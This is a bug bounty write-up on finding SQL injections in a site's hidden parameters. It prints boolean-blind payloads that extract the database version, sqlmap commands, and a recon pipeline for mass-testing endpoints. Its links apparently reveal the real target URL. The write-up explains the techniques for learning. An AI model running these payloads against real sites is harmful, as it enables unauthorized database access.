# :game_die: How I Found Multiple SQL Injections in 5 Minutes in Bug Bounty

---

# How I Found Multiple SQL Injections in 5 Minutes in Bug Bounty

Hi everybody, SQL Injection is one of the most critical vulnerabilities that can be found in web applications I will show you today how I found multiple SQL Injection vulnerabilities while hunting so let’s refer to our target as target.com

While i was taking a fast look at the HTML code

I have found that there are 2 hidden parameters
So i started to test the letter parameter by adding a single quote

I got response code 200 OK which means they do some error handling

but the response was Query failed it looks like a database handled our query in the backend

So let’s try to know how many columns here

>

?letter=a’ ORDER BY 2 — V

I got Query failed

>

?letter=a’ ORDER BY 1 — V

It executed and didn’t get “Query Failed:”

So let’s try to extract the version

>

?letter=a’ UNION SELECT VERSION() — -

The query executed but didn’t get the version on the response

So i started to exfiltrate data using Blind SQL Injection techniques

>

?letter=a’ AND ‘omar’=’omar

>

?letter=a’ AND ‘omar’=’not-omar

We have boolean-based SQLI here

From the previous two conditions, we noticed that

If our condition is true the content-length will be bigger than 80 thousand

If our condition is false the content-length will be in the range of 5 thousand

### Exploitation:

>

?letter=a’ AND ORD(MID(VERSION(),1,1))>96 AND ‘omar’=’omar

The MID() function works as the SUBSTR() and [SUBSTRING()](https://www.w3schools.com/sql/func_mysql_substring.asp) functions, they work to extract a substring from a string at any position using it like that MID(VERSION(),1,1) will extract the first string from the version function MID(VERSION(),2,1) will extract the second string from the version function

The ORD() function is used to represent all inputs to your PC in decimal value

*ASCII Table*

Let’s assume that the first string at version() is ‘a’ so the output of the mix of these functions ORD(MID(VERSION(),1,1)) will be 97 according to the above table

We use this technique instead of doing heavy brute force to make it smart light brute force

So we will check if the first string is small char according to the previous table

>

?letter=a’ AND ORD(MID(VERSION(),1,1))>96 AND ’omar’=’omar

According to the Content-length, the condition is false

So we will check if the first string is capital char

>

?letter=a’ AND ORD(MID(VERSION(),1,1))>64 AND ‘omar’=’omar

According to the Content-length, the condition is false

## Get Omar Hashem’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

So we will check if the first string is a number

>

?letter=a’ AND ORD(MID(VERSION(),1,1))<58 AND ‘omar’=’omar

?letter=a’ AND ORD(MID(VERSION(),1,1))>47 AND ‘omar’=’omar

Both of the queries are a True condition, According to the Content-length

>

?letter=a’ AND ORD(MID(VERSION(),1,1))=53 AND ‘omar’=’omar

Condition is true, According to the Content-length

Now we have extracted the first string from the version function which according to ASCII Table above is equal to 5

the coolest thing about this technique is that instead of doing like 100 requests to extract one substring we can do it in less than 10 requests

Anyway until now i think having this fun it’s enough and now we should move to sqlmap

>

BTW the previous technique is the same technique that sqlmap will use to extract the banner

### The first SQLI

>

python3 sqlmap.py -u “[https://target.com/target.php?letter=a](https://etcsl.orinst.ox.ac.uk/edition2/etcsllemma.php?letter=a)" -p letter -b

Let’s get back to HTML code

If you remember that we were having two hidden parameters “letter” AND “pos”

### The second SQLI

So let’s test the “pos” param

>

python3 sqlmap.py -u “[https://target.com/target.php?pos=a](https://etcsl.orinst.ox.ac.uk/edition2/etcsllemma.php?letter=a)" -p pos -b

Usually, developers make the same mistakes across the application so i have automated the same attack across all parameters and endpoints

### Recon:

I have collected endpoints from AlienVault’s Open Threat Exchange, the Wayback Machine, and Common Crawl using gau and then using uro to filter the output to get rid of images, css, and js and get only unique endpoints

>

┌──(omar㉿kali)-[~]
└─$ gau target.com |uro > passive-endpoints

Then get endpoints that have parameters

>

┌──(omar㉿kali)-[~]
└─$ cat passive-endpoints|grep ‘?’ >parameter-endpoint

Let’s replace the parameter value with a single quote ‘

>

┌──(omar㉿kali)-[~]
└─$ cat parameter-endpoint|qsreplace \’ >sqli-test-endpoints

Let’s match the response to “Query failed:”

>

┌──(omar㉿kali)-[~]
└─$ httpx -l sqli-test-endpoints -ms “Query failed:”

### The third SQLI

Found that the “lookup” parameter response with Query failed:

>

python3 sqlmap.py -u “[https://target.com/target.php?lookup=a](https://etcsl.orinst.ox.ac.uk/edition2/etcsllemma.php?letter=a)" -p lookup -b

We got a new one

Hope you guys enjoyed the write-up

## Don't forget to Keep in touch

Twitter: [@OmarHashem666](https://twitter.com/OmarHashem666)

Linkedin: [https://www.linkedin.com/in/omar-1-hashem](https://www.linkedin.com/in/omar-1-hashem)

Youtube: [https://www.youtube.com/@omarhashem7351](https://www.youtube.com/@omarhashem7351)

### Stay In Touch:

[Linkedin](https://www.linkedin.com/in/omar-1-hashem) | [Youtube](https://www.youtube.com/channel/UCJ1yNtgZP5LRO7ebZXSnAZQ) | [Twitter](https://twitter.com/OmarHashem666)

---
